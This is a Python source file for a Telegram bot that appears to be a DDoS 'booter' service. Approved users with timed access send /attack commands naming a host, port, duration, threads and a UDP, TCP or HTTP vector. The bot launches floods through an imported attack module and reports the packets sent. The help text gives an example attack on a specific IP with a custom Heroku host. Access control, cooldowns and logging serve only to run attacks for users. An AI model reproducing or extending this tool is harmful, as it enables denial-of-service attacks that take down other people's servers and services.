#!/usr/bin/python3
import datetime
import os
import threading
import telebot

import config
from king import attack, VECTORS

# ── Mongo / Config / User / Logging Code (Same as before) ──────────────────
# (Maine eh saara code same rakheya hai, sirf attack part change kitta hai)
_mongo_client, _mongo_db, _users_col, _logs_col = None, None, None, None
if config.MONGO_URI:
    try:
        from pymongo import MongoClient
        _mongo_client = MongoClient(config.MONGO_URI, serverSelectionTimeoutMS=5000)
        _mongo_db = _mongo_client[config.MONGO_DB]
        _users_col = _mongo_db[config.MONGO_USERS]
        _logs_col = _mongo_db[config.MONGO_LOGS]
        _mongo_client.server_info()
        print(f"[mongo] connected to {config.MONGO_DB}")
    except Exception as e:
        print(f"[mongo] unavailable ({e}); falling back to files")

bot = telebot.TeleBot(config.BOT_TOKEN)
admin_id = list(config.ADMIN_IDS)
USER_FILE = config.USER_FILE
LOG_FILE = config.LOG_FILE
user_approval_expiry = {}
bgmi_cooldown = {}
COOLDOWN_TIME = config.COOLDOWN_TIME

def _file_read_users():
    try:
        with open(USER_FILE, "r") as f: return [ln.strip() for ln in f.read().splitlines() if ln.strip()]
    except FileNotFoundError: return []

def _file_write_users(uids):
    with open(USER_FILE, "w") as f:
        for uid in uids: f.write(f"{uid}\n")

def load_users():
    global allowed_user_ids
    allowed_user_ids = []
    user_approval_expiry.clear()
    if _users_col is not None:
        for doc in _users_col.find({}):
            uid = str(doc.get("_id"))
            allowed_user_ids.append(uid)
            expiry = doc.get("expiry")
            if expiry: user_approval_expiry[uid] = expiry
    else:
        allowed_user_ids = _file_read_users()
    return allowed_user_ids

def persist_add(user_id, expiry):
    if _users_col is not None:
        _users_col.update_one({"_id": str(user_id)}, {"$set": {"expiry": expiry, "added_at": datetime.datetime.utcnow()}}, upsert=True)
    else:
        uids = _file_read_users()
        if str(user_id) not in uids:
            uids.append(str(user_id))
            _file_write_users(uids)

def persist_remove(user_id):
    if _users_col is not None: _users_col.delete_one({"_id": str(user_id)})
    else: _file_write_users([u for u in _file_read_users() if u != str(user_id)])

def persist_clear():
    if _users_col is not None: _users_col.delete_many({})
    else: _file_write_users([])

def persist_log(user_id, command, target=None, port=None, duration=None, vector=None):
    entry = {"user_id": str(user_id), "ts": datetime.datetime.utcnow(), "command": command, "target": target, "port": port, "duration": duration, "vector": vector}
    if _logs_col is not None:
        try: _logs_col.insert_one(entry)
        except: pass
    line = (f"UserID: {user_id} | {entry['ts']} | {command}" + (f" | Target: {target}" if target else "") + (f" | Port: {port}" if port else "") + (f" | Time: {duration}" if duration else "") + (f" | Vector: {vector}" if vector else ""))
    try:
        with open(LOG_FILE, "a") as f: f.write(line + "\n")
    except OSError: pass

allowed_user_ids = load_users()

def log_command(user_id, target, port, duration):
    try:
        info = bot.get_chat(user_id)
        username = f"@{info.username}" if info.username else f"UserID: {user_id}"
    except: username = f"UserID: {user_id}"
    with open(LOG_FILE, "a") as f:
        f.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

def get_remaining_approval_time(user_id):
    expiry = user_approval_expiry.get(user_id)
    if not expiry: return "N/A"
    remaining = expiry - datetime.datetime.now()
    if remaining.total_seconds() < 0: return "Expired"
    return str(remaining)

def set_approval_expiry_date(user_id, duration, time_unit):
    now = datetime.datetime.now()
    unit = time_unit.lower()
    if unit in ("hour", "hours"): expiry = now + datetime.timedelta(hours=duration)
    elif unit in ("day", "days"): expiry = now + datetime.timedelta(days=duration)
    elif unit in ("week", "weeks"): expiry = now + datetime.timedelta(weeks=duration)
    elif unit in ("month", "months"): expiry = now + datetime.timedelta(days=30 * duration)
    else: return None
    user_approval_expiry[str(user_id)] = expiry
    persist_add(user_id, expiry)
    return expiry

# (Add, Remove, Myinfo, Clearlogs, Clearusers, Allusers, Logs, Mylogs same as before)
@bot.message_handler(commands=["add"])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id: return bot.reply_to(message, "Not authorized.")
    parts = message.text.split()
    if len(parts) <= 2: return bot.reply_to(message, "Usage: /add <user_id> <duration>")
    user_to_add, duration_str = parts[1], parts[2]
    try:
        duration = int(duration_str[:-4])
        if duration <= 0: raise ValueError
        time_unit = duration_str[-4:].lower()
        if time_unit not in ("hour", "hours", "day", "days", "week", "weeks", "month", "months"): raise ValueError
    except: return bot.reply_to(message, "Invalid duration.")
    if user_to_add in allowed_user_ids: return bot.reply_to(message, "User already exists.")
    allowed_user_ids.append(user_to_add)
    expiry = set_approval_expiry_date(user_to_add, duration, time_unit)
    if expiry: bot.reply_to(message, f"User {user_to_add} added. Expires {expiry.strftime('%Y-%m-%d %H:%M:%S')}.")
    else: bot.reply_to(message, "Failed.")

@bot.message_handler(commands=["remove"])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id: return bot.reply_to(message, "Not authorized.")
    parts = message.text.split()
    if len(parts) <= 1: return bot.reply_to(message, "Usage: /remove <user_id>")
    user_to_remove = parts[1]
    if user_to_remove not in allowed_user_ids: return bot.reply_to(message, f"User {user_to_remove} not found.")
    allowed_user_ids.remove(user_to_remove)
    user_approval_expiry.pop(user_to_remove, None)
    bgmi_cooldown.pop(user_to_remove, None)
    persist_remove(user_to_remove)
    bot.reply_to(message, f"User {user_to_remove} removed.")

@bot.message_handler(commands=["myinfo"])
def get_user_info(message):
    user_id = str(message.chat.id)
    try:
        info = bot.get_chat(user_id)
        username = info.username or "N/A"
    except: username = "N/A"
    role = "Admin" if user_id in admin_id else "User"
    remaining = get_remaining_approval_time(user_id)
    expiry = user_approval_expiry.get(user_id, "Not Approved")
    text = (f"👤 Your Info:\n\n🆔 User ID: <code>{user_id}</code>\n📝 Username: {username}\n🔖 Role: {role}\n📅 Approval Expiry: {expiry}\n⏳ Remaining: {remaining}")
    bot.reply_to(message, text, parse_mode="HTML")

# ── ATTACK PARSER & HANDLER ───────────────────────────────────────────────

def _parse_attack(text):
    """
    Accept:
        /attack <host> <port> <time> [threads] [udp|tcp|http] [custom_host]
        /attack <host>:<port> <time> [threads] [vector] [custom_host]
    """
    parts = text.split()
    threads = config.DEFAULT_THREADS
    vector = config.DEFAULT_VECTOR
    duration_default = config.DEFAULT_DURATION
    custom_host = None

    # 1. Detect custom_host (if last arg is not a number and not a known vector, it's a host)
    if len(parts) >= 2 and not parts[-1].isdigit() and parts[-1].lower() not in VECTORS and ":" not in parts[-1] and "." in parts[-1]:
        custom_host = parts[-1]
        parts = parts[:-1]

    # 2. Detect trailing vector
    if len(parts) >= 2 and parts[-1].lower() in VECTORS:
        vector = parts[-1].lower()
        parts = parts[:-1]

    # 3. Detect trailing threads
    if len(parts) >= 2 and parts[-1].isdigit() and len(parts) >= 4:
        threads = int(parts[-1])
        parts = parts[:-1]

    if len(parts) == 4: # cmd target port duration
        target, port, duration = parts[1], int(parts[2]), int(parts[3])
    elif len(parts) in (2, 3): # cmd host:port [duration]
        head = parts[1]
        if ":" not in head: raise ValueError("missing port — use host:port")
        host, _, port_str = head.rpartition(":")
        target, port = host, int(port_str)
        duration = int(parts[2]) if len(parts) == 3 else duration_default
    else:
        raise ValueError("usage: /attack <host> <port> <time> [threads] [vector] [custom_host]")

    if not target: raise ValueError("empty target")
    if not (0 < port < 65536): raise ValueError(f"port out of range: {port}")
    if not (0 < duration <= config.MAX_DURATION): raise ValueError(f"time must be 1-{config.MAX_DURATION}s")
    if not (0 < threads <= config.MAX_THREADS): raise ValueError(f"threads must be 1-{config.MAX_THREADS}")

    return target, port, duration, threads, vector, custom_host

def start_attack_reply(message, target, port, duration, threads, vector, custom_host=None):
    username = message.from_user.username or message.from_user.first_name
    host_text = f"\nHost:    {custom_host}" if custom_host else ""
    text = (f"{username}, ATTACK STARTED.\n\nTarget:  {target}\nPort:    {port}\nTime:    {duration}s\nThreads: {threads}\nVector:  {vector.upper()}{host_text}")
    bot.reply_to(message, text)

@bot.message_handler(commands=["attack"])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id not in allowed_user_ids: return bot.reply_to(message, "Unauthorized.")

    if user_id not in admin_id and COOLDOWN_TIME > 0:
        last = bgmi_cooldown.get(user_id)
        if last and (datetime.datetime.now() - last).total_seconds() < COOLDOWN_TIME:
            return bot.reply_to(message, f"Cooldown. Wait {COOLDOWN_TIME - int((datetime.datetime.now() - last).total_seconds())}s.")

    try:
        target, port, duration, threads, vector, custom_host = _parse_attack(message.text)
    except ValueError as e:
        return bot.reply_to(message, f"Parse error: {e}")

    if user_id not in admin_id: bgmi_cooldown[user_id] = datetime.datetime.now()

    persist_log(user_id, "/attack", target, port, duration, vector)
    log_command(user_id, target, port, duration)
    start_attack_reply(message, target, port, duration, threads, vector, custom_host)

    def _run():
        t0 = datetime.datetime.now()
        # HEROKU LOG PRINT
        print(f"[ATTACK] Firing {threads} threads at {target}:{port} via {vector.upper()} (Host: {custom_host or target})")
        
        try:
            r = attack(
                target, port, duration, threads=threads,
                payload_size=config.PAYLOAD_SIZE, vector=vector, custom_host=custom_host
            )
            elapsed = (datetime.datetime.now() - t0).total_seconds()

            # HEROKU LOG PRINT
            print(f"[ATTACK DONE] Sent: {r['sent']}, Errors: {r['errors']}, ErrLast: {r.get('last_error')}")

            lines = [
                "✅ Attack complete",
                f"Target:   {target}:{port}",
                f"Vector:   {vector.upper()}",
                f"Workers:  {r['workers']}/{threads}",
                f"Sent:     {r['sent']}",
                f"Errors:   {r['errors']}",
                f"Duration: {elapsed:.1f}s",
            ]
            if r.get("last_error"): lines.append(f"Last err: {r['last_error']}")
            bot.send_message(message.chat.id, "\n".join(lines))

        except Exception as e:
            print(f"[ATTACK ERROR] {e}")
            try: bot.send_message(message.chat.id, f"❌ Attack error: {e}")
            except: pass

    threading.Thread(target=_run, daemon=True).start()

@bot.message_handler(commands=["help"])
def show_help(message):
    text = (
        "Available commands:\n"
        "/attack    — /attack <host> <port> <time> [threads] [udp|tcp|http] [custom_host]\n"
        "             Example: /attack 76.223.82.62 443 30 100 http dddostes-ed43fad90dc5.herokuapp.com\n"
        "/rules, /mylogs, /plan, /myinfo, /admincmd"
    )
    bot.reply_to(message, text)

# (Boot section)
if __name__ == "__main__":
    storage = "mongo" if _users_col is not None else "files"
    print(f"[boot] storage={storage}  users={len(allowed_user_ids)}  vectors={VECTORS}")
    bot.infinity_polling(skip_pending=True, timeout=30)
